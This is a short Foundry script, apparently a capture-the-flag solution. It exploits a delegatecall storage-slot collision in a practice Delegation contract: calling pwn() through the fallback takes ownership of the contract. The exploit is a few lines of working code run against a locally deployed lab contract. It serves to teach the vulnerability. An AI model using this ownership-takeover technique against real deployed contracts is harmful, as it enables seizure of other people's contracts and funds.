// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Delegation, Delegate} from "../src/Delegation.sol";

contract DelegationSolution is Script {
    // $ forge script script/Delegation.s.sol --tc DelegationSolution

    function run() external {
        Delegate delegate = new Delegate(msg.sender);
        Delegation delegationInstance = new Delegation(address(delegate));

        // --- Attack Starts from Here ---
        address attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);
        vm.startPrank(attacker);

        // - In `Delegation` contract, it fires function in `Delegate` contract in his context using `delegatecall`.
        // - `Delegate` contract has a method `pwn` that changes the first storage slot (owner).
        // - `Delegation` contract first storage slot is also the `owner` variable.
        // - If we delegate called to `pwn()` function we will change the first storage slot in the `Delegation` contract.
        // - `owner` variable lies in the first slot so it will be changed to the caller address, and we will path the challenge.

        console.log("owner:", delegationInstance.owner());
        (bool success,) = address(delegationInstance).call(abi.encodeWithSignature("pwn()"));
        require(success, "Failed to delegateCall");
        console.log("new owner:", delegationInstance.owner());
    }
}
